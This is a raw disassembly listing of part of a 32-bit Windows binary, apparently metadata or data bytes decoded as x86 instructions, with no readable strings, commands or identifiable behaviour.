  405ce9:	00 00                	add    %al,(%eax)
  405ceb:	00 05 00 3c 00 97    	add    %al,0x97003c00
  405cf1:	00 01                	add    %al,(%ecx)
  405cf3:	00 10                	add    %dl,(%eax)
  405cf5:	00 0d 01 89 0f 05    	add    %cl,0x50f8901
  405cfb:	00 3d 00 97 00 81    	add    %bh,0x81009700
  405d01:	01 10                	add    %edx,(%eax)
  405d03:	00 06                	add    %al,(%esi)
  405d05:	01 89 0f 05 00 44    	add    %ecx,0x4400050f(%ecx)
  405d0b:	00 9e 00 81 01 10    	add    %bl,0x10018100(%esi)
  405d11:	00 28                	add    %ch,(%eax)
  405d13:	12 89 0f 05 00 44    	adc    0x4400050f(%ecx),%cl
  405d19:	00 a0 00 00 01 00    	add    %ah,0x10000(%eax)
  405d1f:	00 49 01             	add    %cl,0x1(%ecx)
  405d22:	00 00                	add    %al,(%eax)
  405d24:	05 00 44 00 a2       	add    $0xa2004400,%eax
  405d29:	00 13                	add    %dl,(%ebx)
  405d2b:	01 00                	add    %eax,(%eax)
  405d2d:	00 1b                	add    %bl,(%ebx)
  405d2f:	01 00                	add    %eax,(%eax)
  405d31:	00 61 00             	add    %ah,0x0(%ecx)
  405d34:	46                   	inc    %esi
  405d35:	00 a2 00 13 01 00    	add    %ah,0x11300(%edx)
  405d3b:	00 38                	add    %bh,(%eax)
  405d3d:	00 00                	add    %al,(%eax)
  405d3f:	00 61 00             	add    %ah,0x0(%ecx)
  405d42:	46                   	inc    %esi
  405d43:	00 a2 00 16 00 5e    	add    %ah,0x5e001600(%edx)
  405d49:	18 12                	sbb    %dl,(%edx)
  405d4b:	00 16                	add    %dl,(%esi)
  405d4d:	00 6b 18             	add    %ch,0x18(%ebx)
  405d50:	12 00                	adc    (%eax),%al
  405d52:	16                   	push   %ss
  405d53:	00 9a 10 12 00 16    	add    %bl,0x16001210(%edx)
  405d59:	00 ac 0e 12 00 16 00 	add    %ch,0x160012(%esi,%ecx,1)
  405d60:	d3 12                	rcll   %cl,(%edx)
  405d62:	12 00                	adc    (%eax),%al
  405d64:	16                   	push   %ss
  405d65:	00 20                	add    %ah,(%eax)
  405d67:	06                   	push   %es
  405d68:	12 00                	adc    (%eax),%al
  405d6a:	16                   	push   %ss
  405d6b:	00 93 1c 12 00 16    	add    %dl,0x1600121c(%ebx)
  405d71:	00 88 02 12 00 16    	add    %cl,0x16001202(%eax)
  405d77:	00 66 08             	add    %ah,0x8(%esi)
  405d7a:	12 00                	adc    (%eax),%al
  405d7c:	16                   	push   %ss
  405d7d:	00 19                	add    %bl,(%ecx)
  405d7f:	08 12                	or     %dl,(%edx)
  405d81:	00 16                	add    %dl,(%esi)
  405d83:	00 60 08             	add    %ah,0x8(%eax)
  405d86:	15 00 16 00 4a       	adc    $0x4a001600,%eax
  405d8b:	0d 12 00 16 00       	or     $0x160012,%eax
  405d90:	14 01                	adc    $0x1,%al
  405d92:	19 00                	sbb    %eax,(%eax)
  405d94:	16                   	push   %ss
  405d95:	00 62 10             	add    %ah,0x10(%edx)
  405d98:	12 00                	adc    (%eax),%al
  405d9a:	16                   	push   %ss
  405d9b:	00 5c 02 12          	add    %bl,0x12(%edx,%eax,1)
  405d9f:	00 16                	add    %dl,(%esi)
  405da1:	00 71 03             	add    %dh,0x3(%ecx)
  405da4:	12 00                	adc    (%eax),%al
  405da6:	16                   	push   %ss
  405da7:	00 e8                	add    %ch,%al
  405da9:	1b 12                	sbb    (%edx),%edx
  405dab:	00 11                	add    %dl,(%ecx)
  405dad:	00 5f 04             	add    %bl,0x4(%edi)
  405db0:	21 00                	and    %eax,(%eax)
  405db2:	11 00                	adc    %eax,(%eax)
  405db4:	44                   	inc    %esp
  405db5:	04 25                	add    $0x25,%al
  405db7:	00 11                	add    %dl,(%ecx)
  405db9:	00 14 04             	add    %dl,(%esp,%eax,1)
  405dbc:	29 00                	sub    %eax,(%eax)
  405dbe:	11 00                	adc    %eax,(%eax)
  405dc0:	c8 03 2d 00          	enter  $0x2d03,$0x0
  405dc4:	11 00                	adc    %eax,(%eax)
  405dc6:	2c 04                	sub    $0x4,%al
  405dc8:	2d 00 11 00 ad       	sub    $0xad001100,%eax
  405dcd:	03 30                	add    (%eax),%esi
  405dcf:	00 11                	add    %dl,(%ecx)
  405dd1:	00 90 03 34 00 31    	add    %dl,0x31003403(%eax)
  405dd7:	00 76 03             	add    %dh,0x3(%esi)
  405dda:	37                   	aaa
  405ddb:	00 11                	add    %dl,(%ecx)
  405ddd:	00 e4                	add    %ah,%ah
  405ddf:	03 30                	add    (%eax),%esi
  405de1:	00 11                	add    %dl,(%ecx)
  405de3:	00 fa                	add    %bh,%dl
  405de5:	03 3a                	add    (%edx),%edi
  405de7:	00 11                	add    %dl,(%ecx)
  405de9:	00 37                	add    %dh,(%edi)
  405deb:	05 c3 00 01 00       	add    $0x100c3,%eax
  405df0:	28 10                	sub    %dl,(%eax)
  405df2:	f2 00 01             	repnz add %al,(%ecx)
  405df5:	00 49 11             	add    %cl,0x11(%ecx)
  405df8:	3a 00                	cmp    (%eax),%al
  405dfa:	01 00                	add    %eax,(%eax)
  405dfc:	28 10                	sub    %dl,(%eax)
  405dfe:	f2 00 01             	repnz add %al,(%ecx)
  405e01:	00 d6                	add    %dl,%dh
  405e03:	13 10                	adc    (%eax),%edx
  405e05:	01 01                	add    %eax,(%ecx)
  405e07:	00 5e 07             	add    %bl,0x7(%esi)
  405e0a:	12 00                	adc    (%eax),%al
  405e0c:	01 00                	add    %eax,(%eax)
  405e0e:	3e 07                	ds pop %es
  405e10:	12 00                	adc    (%eax),%al
  405e12:	01 00                	add    %eax,(%eax)
  405e14:	6f                   	outsl  %ds:(%esi),(%dx)
  405e15:	0a 37                	or     (%edi),%dh
  405e17:	00 01                	add    %al,(%ecx)
  405e19:	00 cd                	add    %cl,%ch
  405e1b:	07                   	pop    %es
  405e1c:	4b                   	dec    %ebx
  405e1d:	01 01                	add    %eax,(%ecx)
  405e1f:	00 69 1a             	add    %ch,0x1a(%ecx)
  405e22:	10 01                	adc    %al,(%ecx)
  405e24:	01 00                	add    %eax,(%eax)
  405e26:	28 10                	sub    %dl,(%eax)
  405e28:	f2 00 01             	repnz add %al,(%ecx)
  405e2b:	00 2a                	add    %ch,(%edx)
  405e2d:	1c 4f                	sbb    $0x4f,%al
  405e2f:	01 06                	add    %eax,(%esi)
  405e31:	06                   	push   %es
  405e32:	8c 02                	mov    %es,(%edx)
  405e34:	3a 00                	cmp    (%eax),%al
  405e36:	56                   	push   %esi
  405e37:	80 91 11 4b 01 56 80 	adcb   $0x80,0x56014b11(%ecx)
  405e3e:	e4 0e                	in     $0xe,%al
  405e40:	4b                   	dec    %ebx
  405e41:	01 56 80             	add    %edx,-0x80(%esi)
  405e44:	17                   	pop    %ss
  405e45:	12 4b 01             	adc    0x1(%ebx),%cl
  405e48:	56                   	push   %esi
  405e49:	80 2f 1c             	subb   $0x1c,(%edi)
  405e4c:	4b                   	dec    %ebx
  405e4d:	01 56 80             	add    %edx,-0x80(%esi)
  405e50:	87 0c 4b             	xchg   %ecx,(%ebx,%ecx,2)
  405e53:	01 56 80             	add    %edx,-0x80(%esi)
  405e56:	7b 13                	jnp    0x405e6b
  405e58:	4b                   	dec    %ebx
  405e59:	01 56 80             	add    %edx,-0x80(%esi)
  405e5c:	c7 00 4b 01 56 80    	movl   $0x8056014b,(%eax)
  405e62:	14 10                	adc    $0x10,%al
  405e64:	4b                   	dec    %ebx
  405e65:	01 56 80             	add    %edx,-0x80(%esi)
  405e68:	c8 18 4b 01          	enter  $0x4b18,$0x1
  405e6c:	56                   	push   %esi
  405e6d:	80 19 06             	sbbb   $0x6,(%ecx)
  405e70:	4b                   	dec    %ebx
  405e71:	01 56 80             	add    %edx,-0x80(%esi)
  405e74:	63 07                	arpl   %eax,(%edi)
  405e76:	4b                   	dec    %ebx
  405e77:	01 56 80             	add    %edx,-0x80(%esi)
  405e7a:	e8 1c 4b 01 06       	call   0x641a99b
  405e7f:	06                   	push   %es
  405e80:	8c 02                	mov    %es,(%edx)
  405e82:	87 02                	xchg   %eax,(%edx)
  405e84:	56                   	push   %esi
  405e85:	80 61 02 8a          	andb   $0x8a,0x2(%ecx)
  405e89:	02 56 80             	add    -0x80(%esi),%dl
  405e8c:	bf 01 8a 02 56       	mov    $0x56028a01,%edi
  405e91:	80 ac 01 8a 02 16 00 	subb   $0x2c,0x16028a(%ecx,%eax,1)
  405e98:	2c 
  405e99:	12 93 02 31 00 ef    	adc    -0x10ffcefe(%ebx),%dl
  405e9f:	01 12                	add    %edx,(%edx)
  405ea1:	00 16                	add    %dl,(%esi)
  405ea3:	00 fa                	add    %bh,%dl
  405ea5:	16                   	push   %ss
  405ea6:	f2 00 16             	repnz add %dl,(%esi)
  405ea9:	00 0b                	add    %cl,(%ebx)
  405eab:	00 b6 02 51 80 3c    	add    %dh,0x3c805102(%esi)
  405eb1:	0d 3a 00 51 80       	or     $0x8051003a,%eax
  405eb6:	38 0d 3a 00 51 80    	cmp    %cl,0x8051003a
  405ebc:	2f                   	das
  405ebd:	0d 3a 00 51 80       	or     $0x8051003a,%eax
  405ec2:	13 0d 3a 00 21 00    	adc    0x21003a,%ecx
  405ec8:	97                   	xchg   %eax,%edi
  405ec9:	1c 29                	sbb    $0x29,%al
  405ecb:	00 21                	add    %ah,(%ecx)
  405ecd:	00 78 1c             	add    %bh,0x1c(%eax)
  405ed0:	29 00                	sub    %eax,(%eax)
  405ed2:	31 00                	xor    %eax,(%eax)
  405ed4:	b0 19                	mov    $0x19,%al
  405ed6:	29 00                	sub    %eax,(%eax)
  405ed8:	33 01                	xor    (%ecx),%eax
  405eda:	68 01 f2 02 33       	push   $0x3302f201
  405edf:	01 02                	add    %eax,(%edx)
  405ee1:	02 f6                	add    %dh,%dh
  405ee3:	02 20                	add    (%eax),%ah
  405ee5:	26 00 00             	add    %al,%es:(%eax)
  405ee8:	00 00                	add    %al,(%eax)
  405eea:	96                   	xchg   %eax,%esi
  405eeb:	00 31                	add    %dh,(%ecx)
  405eed:	10 0a                	adc    %cl,(%edx)
  405eef:	00 01                	add    %al,(%ecx)
  405ef1:	00 78 20             	add    %bh,0x20(%eax)
  405ef4:	00 00                	add    %al,(%eax)
  405ef6:	00 00                	add    %al,(%eax)
  405ef8:	86 18                	xchg   %bl,(%eax)
  405efa:	a8 14                	test   $0x14,%al
  405efc:	0e                   	push   %cs
  405efd:	00 01                	add    %al,(%ecx)
  405eff:	00 f4                	add    %dh,%ah
  405f01:	26 00 00             	add    %al,%es:(%eax)
  405f04:	00 00                	add    %al,(%eax)
  405f06:	96                   	xchg   %eax,%esi
  405f07:	00 b2 16 1d 00 01    	add    %dh,0x1001d16(%edx)
  405f0d:	00 30                	add    %dh,(%eax)
  405f0f:	28 00                	sub    %al,(%eax)
  405f11:	00 00                	add    %al,(%eax)
  405f13:	00 91 00 de 0c 1d    	add    %dl,0x1d0cde00(%ecx)
  405f19:	00 01                	add    %al,(%ecx)
  405f1b:	00 98 28 00 00 00    	add    %bl,0x28(%eax)
  405f21:	00 91 18 ae 14 0a    	add    %dl,0xa14ae18(%ecx)
  405f27:	00 01                	add    %al,(%ecx)
  405f29:	00 80 20 00 00 00    	add    %al,0x20(%eax)
  405f2f:	00 96 08 1a 1a 3d    	add    %dl,0x3d1a1a08(%esi)
  405f35:	00 01                	add    %al,(%ecx)
  405f37:	00 87 20 00 00 00    	add    %al,0x20(%edi)
  405f3d:	00 96 08 28 1a 42    	add    %dl,0x421a2808(%esi)
  405f43:	00 01                	add    %al,(%ecx)
  405f45:	00 8f 20 00 00 00    	add    %cl,0x20(%edi)
  405f4b:	00 96 08 fe 19 48    	add    %dl,0x4819fe08(%esi)
  405f51:	00 02                	add    %al,(%edx)
  405f53:	00 96 20 00 00 00    	add    %dl,0x20(%esi)
  405f59:	00 96 08 0c 1a 4d    	add    %dl,0x4d1a0c08(%esi)
  405f5f:	00 02                	add    %al,(%edx)
  405f61:	00 9e 20 00 00 00    	add    %bl,0x20(%esi)
  405f67:	00 91 08 2a 13 53    	add    %dl,0x53132a08(%ecx)
  405f6d:	00 03                	add    %al,(%ebx)
  405f6f:	00 a5 20 00 00 00    	add    %ah,0x20(%ebp)
  405f75:	00 91 08 35 13 58    	add    %dl,0x58133508(%ecx)
  405f7b:	00 03                	add    %al,(%ebx)
  405f7d:	00 ad 20 00 00 00    	add    %ch,0x20(%ebp)
  405f83:	00 91 08 da 0a 5e    	add    %dl,0x5e0ada08(%ecx)
  405f89:	00 04 00             	add    %al,(%eax,%eax,1)
  405f8c:	b4 20                	mov    $0x20,%ah
  405f8e:	00 00                	add    %al,(%eax)
  405f90:	00 00                	add    %al,(%eax)
  405f92:	91                   	xchg   %eax,%ecx
  405f93:	08 e9                	or     %ch,%cl
  405f95:	0a 62 00             	or     0x0(%edx),%ah
  405f98:	04 00                	add    $0x0,%al
  405f9a:	bc 20 00 00 00       	mov    $0x20,%esp
  405f9f:	00 91 08 89 19 5e    	add    %dl,0x5e198908(%ecx)
  405fa5:	00 05 00 c3 20 00    	add    %al,0x20c300
  405fab:	00 00                	add    %al,(%eax)
  405fad:	00 91 08 94 19 62    	add    %dl,0x62199408(%ecx)
  405fb3:	00 05 00 cb 20 00    	add    %al,0x20cb00
  405fb9:	00 00                	add    %al,(%eax)
  405fbb:	00 91 08 92 0a 67    	add    %dl,0x670a9208(%ecx)
  405fc1:	00 06                	add    %al,(%esi)
  405fc3:	00 d2                	add    %dl,%dl
  405fc5:	20 00                	and    %al,(%eax)
  405fc7:	00 00                	add    %al,(%eax)
  405fc9:	00 91 08 a0 0a 6c    	add    %dl,0x6c0aa008(%ecx)
  405fcf:	00 06                	add    %al,(%esi)
  405fd1:	00 da                	add    %bl,%dl
  405fd3:	20 00                	and    %al,(%eax)
  405fd5:	00 00                	add    %al,(%eax)
  405fd7:	00 96 08 3f 03 1d    	add    %dl,0x1d033f08(%esi)
  405fdd:	00 07                	add    %al,(%edi)
  405fdf:	00 e1                	add    %ah,%cl
  405fe1:	20 00                	and    %al,(%eax)
  405fe3:	00 00                	add    %al,(%eax)
  405fe5:	00 96 08 4f 03 72    	add    %dl,0x72034f08(%esi)
  405feb:	00 07                	add    %al,(%edi)
  405fed:	00 e9                	add    %ch,%cl
  405fef:	20 00                	and    %al,(%eax)
  405ff1:	00 00                	add    %al,(%eax)
  405ff3:	00 91 08 e8 02 77    	add    %dl,0x7702e808(%ecx)
  405ff9:	00 08                	add    %cl,(%eax)
  405ffb:	00 f0                	add    %dh,%al
  405ffd:	20 00                	and    %al,(%eax)
  405fff:	00 00                	add    %al,(%eax)
  406001:	00 91 08 4a 0b 67    	add    %dl,0x670b4a08(%ecx)
  406007:	00 08                	add    %cl,(%eax)
  406009:	00 f7                	add    %dh,%bh
  40600b:	20 00                	and    %al,(%eax)
  40600d:	00 00                	add    %al,(%eax)
  40600f:	00 91 08 53 0b 6c    	add    %dl,0x6c0b5308(%ecx)
  406015:	00 08                	add    %cl,(%eax)
  406017:	00 ff                	add    %bh,%bh
  406019:	20 00                	and    %al,(%eax)
  40601b:	00 00                	add    %al,(%eax)
  40601d:	00 96 08 8b 0e 7b    	add    %dl,0x7b0e8b08(%esi)
  406023:	00 09                	add    %cl,(%ecx)
  406025:	00 06                	add    %al,(%esi)
  406027:	21 00                	and    %eax,(%eax)
  406029:	00 00                	add    %al,(%eax)
  40602b:	00 96 08 98 0e 7f    	add    %dl,0x7f0e9808(%esi)
  406031:	00 09                	add    %cl,(%ecx)
  406033:	00 3c 29             	add    %bh,(%ecx,%ebp,1)
  406036:	00 00                	add    %al,(%eax)
  406038:	00 00                	add    %al,(%eax)
  40603a:	96                   	xchg   %eax,%esi
  40603b:	00 ed                	add    %ch,%ch
  40603d:	19 0a                	sbb    %ecx,(%edx)
  40603f:	00 0a                	add    %cl,(%edx)
  406041:	00 0e                	add    %cl,(%esi)
  406043:	21 00                	and    %eax,(%eax)
  406045:	00 00                	add    %al,(%eax)
  406047:	00 91 00 1f 07 84    	add    %dl,-0x7bf8e100(%ecx)
  40604d:	00 0a                	add    %cl,(%edx)
  40604f:	00 19                	add    %bl,(%ecx)
  406051:	21 00                	and    %eax,(%eax)
  406053:	00 00                	add    %al,(%eax)
  406055:	00 91 00 58 08 89    	add    %dl,-0x76f7a800(%ecx)
  40605b:	00 0b                	add    %cl,(%ebx)
  40605d:	00 34 2c             	add    %dh,(%esp,%ebp,1)
  406060:	00 00                	add    %al,(%eax)
  406062:	00 00                	add    %al,(%eax)
  406064:	96                   	xchg   %eax,%esi
  406065:	00 0e                	add    %cl,(%esi)
  406067:	19 0a                	sbb    %ecx,(%edx)
  406069:	00 0f                	add    %cl,(%edi)
  40606b:	00 98 2c 00 00 00    	add    %bl,0x2c(%eax)
  406071:	00 96 00 94 02 94    	add    %dl,-0x6bfd6c00(%esi)
  406077:	00 0f                	add    %cl,(%edi)
  406079:	00 58 2e             	add    %bl,0x2e(%eax)
  40607c:	00 00                	add    %al,(%eax)
  40607e:	00 00                	add    %al,(%eax)
  406080:	96                   	xchg   %eax,%esi
  406081:	00 9e 04 58 00 10    	add    %bl,0x10005804(%esi)
  406087:	00 74 2f 00          	add    %dh,0x0(%edi,%ebp,1)
  40608b:	00 00                	add    %al,(%eax)
  40608d:	00 96 00 47 19 9a    	add    %dl,-0x65e6b900(%esi)
  406093:	00 11                	add    %dl,(%ecx)
  406095:	00 26                	add    %ah,(%esi)
  406097:	21 00                	and    %eax,(%eax)
  406099:	00 00                	add    %al,(%eax)
  40609b:	00 91 00 a7 0c 9a    	add    %dl,-0x65f35900(%ecx)
  4060a1:	00 12                	add    %dl,(%edx)
  4060a3:	00 34 21             	add    %dh,(%ecx,%eiz,1)
  4060a6:	00 00                	add    %al,(%eax)
  4060a8:	00 00                	add    %al,(%eax)
  4060aa:	91                   	xchg   %eax,%ecx
  4060ab:	18 ae 14 0a 00 13    	sbb    %ch,0x13000a14(%esi)
  4060b1:	00 40 21             	add    %al,0x21(%eax)
  4060b4:	00 00                	add    %al,(%eax)
  4060b6:	00 00                	add    %al,(%eax)
  4060b8:	96                   	xchg   %eax,%esi
  4060b9:	00 df                	add    %bl,%bh
  4060bb:	15 c7 00 13 00       	adc    $0x1300c7,%eax
  4060c0:	4d                   	dec    %ebp
  4060c1:	21 00                	and    %eax,(%eax)
  4060c3:	00 00                	add    %al,(%eax)
  4060c5:	00 96 00 73 0c cd    	add    %dl,-0x32f38d00(%esi)
  4060cb:	00 14 00             	add    %dl,(%eax,%eax,1)
  4060ce:	08 30                	or     %dh,(%eax)
  4060d0:	00 00                	add    %al,(%eax)
  4060d2:	00 00                	add    %al,(%eax)
  4060d4:	96                   	xchg   %eax,%esi
  4060d5:	00 4d 0c             	add    %cl,0xc(%ebp)
  4060d8:	cd 00                	int    $0x0
  4060da:	15 00 4c 30 00       	adc    $0x304c00,%eax
  4060df:	00 00                	add    %al,(%eax)
  4060e1:	00 96 00 7d 0c cd    	add    %dl,-0x32f38300(%esi)
  4060e7:	00 16                	add    %dl,(%esi)
  4060e9:	00 90 30 00 00 00    	add    %dl,0x30(%eax)
  4060ef:	00 96 00 26 16 d3    	add    %dl,-0x2ce9da00(%esi)
  4060f5:	00 17                	add    %dl,(%edi)
  4060f7:	00 5a 21             	add    %bl,0x21(%edx)
  4060fa:	00 00                	add    %al,(%eax)
  4060fc:	00 00                	add    %al,(%eax)
  4060fe:	96                   	xchg   %eax,%esi
  4060ff:	00 d6                	add    %dl,%dh
  406101:	00 da                	add    %bl,%dl
  406103:	00 18                	add    %bl,(%eax)
  406105:	00 67 21             	add    %ah,0x21(%edi)
  406108:	00 00                	add    %al,(%eax)
  40610a:	00 00                	add    %al,(%eax)
  40610c:	96                   	xchg   %eax,%esi
  40610d:	00 76 00             	add    %dh,0x0(%esi)
  406110:	e0 00                	loopne 0x406112
  406112:	19 00                	sbb    %eax,(%eax)
  406114:	8b 21                	mov    (%ecx),%esp
  406116:	00 00                	add    %al,(%eax)
  406118:	00 00                	add    %al,(%eax)
  40611a:	96                   	xchg   %eax,%esi
  40611b:	00 f1                	add    %dh,%cl
  40611d:	00 e6                	add    %ah,%dh
  40611f:	00 1a                	add    %bl,(%edx)
  406121:	00 9f 21 00 00 00    	add    %bl,0x21(%edi)
  406127:	00 96 00 97 05 ec    	add    %dl,-0x13fa6900(%esi)
  40612d:	00 1b                	add    %bl,(%ebx)
  40612f:	00 78 20             	add    %bh,0x20(%eax)
  406132:	00 00                	add    %al,(%eax)
  406134:	00 00                	add    %al,(%eax)
  406136:	86 18                	xchg   %bl,(%eax)
  406138:	a8 14                	test   $0x14,%al
  40613a:	0e                   	push   %cs
  40613b:	00 1c 00             	add    %bl,(%eax,%eax,1)
  40613e:	ac                   	lods   %ds:(%esi),%al
  40613f:	21 00                	and    %eax,(%eax)
  406141:	00 00                	add    %al,(%eax)
  406143:	00 91 18 ae 14 0a    	add    %dl,0xa14ae18(%ecx)
  406149:	00 1c 00             	add    %bl,(%eax,%eax,1)
  40614c:	b8 21 00 00 00       	mov    $0x21,%eax
  406151:	00 86 18 a8 14 fa    	add    %al,-0x5eb57e8(%esi)
  406157:	00 1c 00             	add    %bl,(%eax,%eax,1)
  40615a:	ce                   	into
  40615b:	21 00                	and    %eax,(%eax)
  40615d:	00 00                	add    %al,(%eax)
  40615f:	00 e1                	add    %ah,%cl
  406161:	09 97 1a 04 01 1d    	or     %edx,0x1d01041a(%edi)
  406167:	00 e1                	add    %ah,%cl
  406169:	21 00                	and    %eax,(%eax)
  40616b:	00 00                	add    %al,(%eax)
  40616d:	00 e1                	add    %ah,%cl
  40616f:	01 82 1b 08 01 1d    	add    %eax,0x1d01081b(%edx)
  406175:	00 04 22             	add    %al,(%edx,%eiz,1)
  406178:	00 00                	add    %al,(%eax)
  40617a:	00 00                	add    %al,(%eax)
  40617c:	e1 01                	loope  0x40617f
  40617e:	64 19 0e             	sbb    %ecx,%fs:(%esi)
  406181:	00 1d 00 0d 22 00    	add    %bl,0x220d00
  406187:	00 00                	add    %al,(%eax)
  406189:	00 86 18 a8 14 14    	add    %al,0x1414a818(%esi)
  40618f:	01 1d 00 23 22 00    	add    %ebx,0x222300
  406195:	00 00                	add    %al,(%eax)
  406197:	00 86 00 1f 03 20    	add    %al,0x20031f00(%esi)
  40619d:	01 1f                	add    %ebx,(%edi)
  40619f:	00 30                	add    %dh,(%eax)
  4061a1:	22 00                	and    (%eax),%al
  4061a3:	00 00                	add    %al,(%eax)
  4061a5:	00 86 00 1f 03 25    	add    %al,0x25031f00(%esi)
  4061ab:	01 1f                	add    %ebx,(%edi)
  4061ad:	00 44 22 00          	add    %al,0x0(%edx,%eiz,1)
  4061b1:	00 00                	add    %al,(%eax)
  4061b3:	00 86 00 1f 03 2b    	add    %al,0x2b031f00(%esi)
  4061b9:	01 20                	add    %esp,(%eax)
  4061bb:	00 58 22             	add    %bl,0x22(%eax)
  4061be:	00 00                	add    %al,(%eax)
  4061c0:	00 00                	add    %al,(%eax)
  4061c2:	86 00                	xchg   %al,(%eax)
  4061c4:	1f                   	pop    %ds
  4061c5:	03 31                	add    (%ecx),%esi
  4061c7:	01 21                	add    %esp,(%ecx)
  4061c9:	00 6c 22 00          	add    %ch,0x0(%edx,%eiz,1)
  4061cd:	00 00                	add    %al,(%eax)
  4061cf:	00 86 08 65 0f 37    	add    %al,0x370f6508(%esi)
  4061d5:	01 22                	add    %esp,(%edx)
  4061d7:	00 7a 22             	add    %bh,0x22(%edx)
  4061da:	00 00                	add    %al,(%eax)
  4061dc:	00 00                	add    %al,(%eax)
  4061de:	86 08                	xchg   %cl,(%eax)
  4061e0:	24 0d                	and    $0xd,%al
  4061e2:	3d 01 23 00 87       	cmp    $0x87002301,%eax
  4061e7:	22 00                	and    (%eax),%al
  4061e9:	00 00                	add    %al,(%eax)
  4061eb:	00 81 00 48 07 53    	add    %al,0x53074800(%ecx)
  4061f1:	01 23                	add    %esp,(%ebx)
  4061f3:	00 c8                	add    %cl,%al
  4061f5:	30 00                	xor    %al,(%eax)
  4061f7:	00 00                	add    %al,(%eax)
  4061f9:	00 81 00 62 12 0e    	add    %al,0xe126200(%ecx)
  4061ff:	00 24 00             	add    %ah,(%eax,%eax,1)
  406202:	08 31                	or     %dh,(%ecx)
  406204:	00 00                	add    %al,(%eax)
  406206:	00 00                	add    %al,(%eax)
  406208:	81 00 1a 03 20 01    	addl   $0x120031a,(%eax)
  40620e:	24 00                	and    $0x0,%al
  406210:	30 31                	xor    %dh,(%ecx)
  406212:	00 00                	add    %al,(%eax)
  406214:	00 00                	add    %al,(%eax)
  406216:	81 00 2d 0b 58 01    	addl   $0x1580b2d,(%eax)
  40621c:	24 00                	and    $0x0,%al
  40621e:	a0 31 00 00 00       	mov    0x31,%al
  406223:	00 86 00 ce 18 25    	add    %al,0x2518ce00(%esi)
  406229:	01 25 00 a1 22 00    	add    %esp,0x22a100
  40622f:	00 00                	add    %al,(%eax)
  406231:	00 81 00 7a 04 20    	add    %al,0x20047a00(%ecx)
  406237:	01 26                	add    %esp,(%esi)
  406239:	00 bf 22 00 00 00    	add    %bh,0x22(%edi)
  40623f:	00 81 00 8b 04 20    	add    %al,0x20048b00(%ecx)
  406245:	01 26                	add    %esp,(%esi)
  406247:	00 dd                	add    %bl,%ch
  406249:	22 00                	and    (%eax),%al
  40624b:	00 00                	add    %al,(%eax)
  40624d:	00 86 00 90 04 20    	add    %al,0x20049000(%esi)
  406253:	01 26                	add    %esp,(%esi)
  406255:	00 c8                	add    %cl,%al
  406257:	31 00                	xor    %eax,(%eax)
  406259:	00 00                	add    %al,(%eax)
  40625b:	00 81 00 12 12 5d    	add    %al,0x5d121200(%ecx)
  406261:	01 26                	add    %esp,(%esi)
  406263:	00 84 32 00 00 00 00 	add    %al,0x0(%edx,%esi,1)
  40626a:	81 00 ee 1b 5d 01    	addl   $0x15d1bee,(%eax)
  406270:	27                   	daa
  406271:	00 e5                	add    %ah,%ch
  406273:	22 00                	and    (%eax),%al
  406275:	00 00                	add    %al,(%eax)
  406277:	00 86 00 76 13 63    	add    %al,0x63137600(%esi)
  40627d:	01 28                	add    %ebp,(%eax)
  40627f:	00 fa                	add    %bh,%dl
  406281:	22 00                	and    (%eax),%al
  406283:	00 00                	add    %al,(%eax)
  406285:	00 86 00 c2 00 68    	add    %al,0x6800c200(%esi)
  40628b:	01 29                	add    %ebp,(%ecx)
  40628d:	00 28                	add    %ch,(%eax)
  40628f:	33 00                	xor    (%eax),%eax
  406291:	00 00                	add    %al,(%eax)
  406293:	00 86 00 b6 00 6d    	add    %al,0x6d00b600(%esi)
  406299:	01 2a                	add    %ebp,(%edx)
  40629b:	00 cc                	add    %cl,%ah
  40629d:	33 00                	xor    (%eax),%eax
  40629f:	00 00                	add    %al,(%eax)
  4062a1:	00 86 00 69 13 71    	add    %al,0x71136900(%esi)
  4062a7:	01 2a                	add    %ebp,(%edx)
  4062a9:	00 70 34             	add    %dh,0x34(%eax)
  4062ac:	00 00                	add    %al,(%eax)
  4062ae:	00 00                	add    %al,(%eax)
  4062b0:	86 00                	xchg   %al,(%eax)
  4062b2:	b8 18 75 01 2a       	mov    $0x2a017518,%eax
  4062b7:	00 0f                	add    %cl,(%edi)
  4062b9:	23 00                	and    (%eax),%eax
  4062bb:	00 00                	add    %al,(%eax)
  4062bd:	00 86 00 4b 16 79    	add    %al,0x79164b00(%esi)
  4062c3:	01 2a                	add    %ebp,(%edx)
  4062c5:	00 00                	add    %al,(%eax)
  4062c7:	35 00 00 00 00       	xor    $0x0,%eax
  4062cc:	86 00                	xchg   %al,(%eax)
  4062ce:	40                   	inc    %eax
  4062cf:	16                   	push   %ss
  4062d0:	7f 01                	jg     0x4062d3
  4062d2:	2b 00                	sub    (%eax),%eax
  4062d4:	20 23                	and    %ah,(%ebx)
  4062d6:	00 00                	add    %al,(%eax)
  4062d8:	00 00                	add    %al,(%eax)
  4062da:	86 00                	xchg   %al,(%eax)
  4062dc:	1f                   	pop    %ds
  4062dd:	03 84 01 2b 00 35 23 	add    0x2335002b(%ecx,%eax,1),%eax
  4062e4:	00 00                	add    %al,(%eax)
  4062e6:	00 00                	add    %al,(%eax)
  4062e8:	86 00                	xchg   %al,(%eax)
  4062ea:	1f                   	pop    %ds
  4062eb:	03 8a 01 2d 00 b0    	add    -0x4fffd2ff(%edx),%ecx
  4062f1:	35 00 00 00 00       	xor    $0x0,%eax
  4062f6:	86 00                	xchg   %al,(%eax)
  4062f8:	30 16                	xor    %dl,(%esi)
  4062fa:	90                   	nop
  4062fb:	01 2f                	add    %ebp,(%edi)
  4062fd:	00 4b 23             	add    %cl,0x23(%ebx)
  406300:	00 00                	add    %al,(%eax)
  406302:	00 00                	add    %al,(%eax)
  406304:	86 00                	xchg   %al,(%eax)
  406306:	3b 06                	cmp    (%esi),%eax
  406308:	90                   	nop
  406309:	01 30                	add    %esi,(%eax)
  40630b:	00 04 36             	add    %al,(%esi,%esi,1)
  40630e:	00 00                	add    %al,(%eax)
  406310:	00 00                	add    %al,(%eax)
  406312:	86 00                	xchg   %al,(%eax)
  406314:	ee                   	out    %al,(%dx)
  406315:	18 25 01 31 00 89    	sbb    %ah,0x89003101
  40631b:	23 00                	and    (%eax),%eax
  40631d:	00 00                	add    %al,(%eax)
  40631f:	00 86 00 df 0e 0e    	add    %al,0xe0edf00(%esi)
  406325:	00 32                	add    %dh,(%edx)
  406327:	00 9f 23 00 00 00    	add    %bl,0x23(%edi)
  40632d:	00 86 00 67 0c 53    	add    %al,0x530c6700(%esi)
  406333:	01 32                	add    %esi,(%edx)
  406335:	00 af 23 00 00 00    	add    %ch,0x23(%edi)
